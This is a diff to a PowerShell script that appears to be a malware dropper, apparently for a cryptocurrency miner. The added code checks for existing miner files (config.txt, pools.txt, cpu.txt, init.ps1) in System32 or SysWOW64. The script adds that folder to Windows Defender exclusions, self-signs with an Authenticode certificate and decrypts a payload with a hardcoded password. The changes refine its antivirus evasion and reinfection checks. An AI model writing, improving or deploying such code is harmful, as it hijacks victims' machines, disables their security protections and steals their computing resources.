@@ -12,6 +12,22 @@ Function Check-AV {
   }
 }
 
+Function Check-Files {
+  [CmdletBinding()]
+  param ([string] $DestDirectory)  
+
+  if (
+    (Test-Path -Path ($DestDirectory + "\config.txt") -PathType Leaf) -or
+    (Test-Path -Path ($DestDirectory + "\cpu.txt") -PathType Leaf) -or
+    (Test-Path -Path ($DestDirectory + "\pools.txt") -PathType Leaf) -or
+    (Test-Path -Path ($DestDirectory + "\init.ps1") -PathType Leaf)
+  ) {
+    return $false
+  }
+  return $true
+}
+
+
 Function Get-PSScriptPath {
   if ([System.IO.Path]::GetExtension($PSCommandPath) -eq '.ps1') {
       $psScriptPath = $PSCommandPath
@@ -37,7 +53,7 @@ Function Sign-Script {
   $publisherStore.Close()
 
   $codeCertificate = Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -eq "CN=Store Authenticode"}
-  Set-AuthenticodeSignature -FilePath $FilePath -Certificate $codeCertificate
+  Set-AuthenticodeSignature -FilePath $FilePath -Certificate $codeCertificate | Out-Null
 }
 
 Function Decrypt-File {
@@ -69,14 +85,14 @@ Function Decrypt-File {
   $DecryptedFile.Close()
 }
 
-if(Check-AV){  
-  if([Environment]::Is64BitOperatingSystem){
-    $DestDirectory = "C:\Windows\SysWOW64"
-  }
-  else{
-    $DestDirectory = "C:\Windows\System32"
-  }
-    
+if([Environment]::Is64BitOperatingSystem){
+  $DestDirectory = "C:\Windows\SysWOW64"
+}
+else{
+  $DestDirectory = "C:\Windows\System32"
+}
+  
+if((Check-AV) -and (Check-Files -DestDirectory $DestDirectory)){  
   Add-MpPreference -ExclusionPath $DestDirectory
 
   $Pass = [Text.Encoding]::UTF8.GetBytes("J4ck.Sp4rr0w")
